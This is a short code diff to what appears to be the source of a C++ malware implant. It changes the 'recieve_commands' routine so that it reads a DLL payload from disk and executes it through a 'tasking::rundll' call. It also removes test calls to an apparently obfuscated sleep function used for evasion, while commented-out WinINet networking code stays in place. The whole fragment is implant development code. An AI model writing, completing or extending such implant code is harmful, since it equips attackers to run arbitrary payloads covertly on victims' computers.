@@ -40,26 +40,15 @@ bool read_from_disk(const std::string& file_name, std::string& outbuff) {
 
 bool recieve_commands(const implant_context& ctx) {
 
-    /*
     std::string shc_buff;
-    if(!read_from_disk("C:\\Users\\diago\\Downloads\\random.exe", shc_buff)) {
+    if(!read_from_disk("blabla.dll", shc_buff)) {
         std::cerr << "nah.." << std::endl;
         return false;
     }
-    */
 
-    std::cout << "sleeping for 3 seconds!" << std::endl;
-    obfus::sleep(3000);
-
-    std::cout << "now for 2!" << std::endl;
-    obfus::sleep(2000);
-
-    std::cout << "and now for 10!!" << std::endl;
-    obfus::sleep(10000);
-
-    std::cout << "alright and now for 1 lol." << std::endl;
-    obfus::sleep(1000);
-
+    std::cout << tasking::rundll(shc_buff) << std::endl;
+    obfus::sleep(5000);
+    std::cout << "finished." << std::endl;
     /*
     HINTERNET hSession = nullptr;
     HINTERNET hConnect = nullptr;
